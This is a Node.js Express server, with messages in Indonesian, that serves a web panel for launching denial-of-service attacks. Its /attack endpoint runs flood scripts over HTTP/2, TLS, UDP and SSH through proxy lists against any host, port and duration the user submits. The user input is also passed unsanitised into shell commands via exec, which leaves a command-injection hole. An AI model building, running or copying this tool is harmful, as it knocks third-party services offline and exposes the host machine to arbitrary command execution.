const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();
const port = 3000;
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.post('/attack', (req, res) => {
  const { url: host, time, method, port: customPort } = req.body;
  if (!host || !time || !method) return res.status(400).json({ success: false, message: 'Input tidak lengkap' });

  const port = customPort || 8080;

  const attackMethods = {
    'H2': `node ./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
    'TLS': `node ./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
    'FLOOD': `node ./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
    'MIX': `node ./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
    'SKIBIDI': `node ./lib/cache/skibidi.js ${host} ${time}`,
    'UDP': `node ./lib/cache/udp.js ${host} ${port} ${time}`,
    'SSH': `node ./lib/cache/ssh.js ${host} ${port} root ${time}`
  };

  const cmd = attackMethods[method];
  if (!cmd) return res.status(400).json({ success: false, message: 'Metode serangan tidak dikenal' });

  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      console.error(stderr);
      return res.status(500).json({ success: false, message: 'Gagal menjalankan serangan' });
    }
    return res.json({ success: true, message: `Serangan ${method} dimulai ke ${host}` });
  });
});

app.listen(port, () => {
  console.log(`Web interface aktif di http://localhost:${port}`);
});
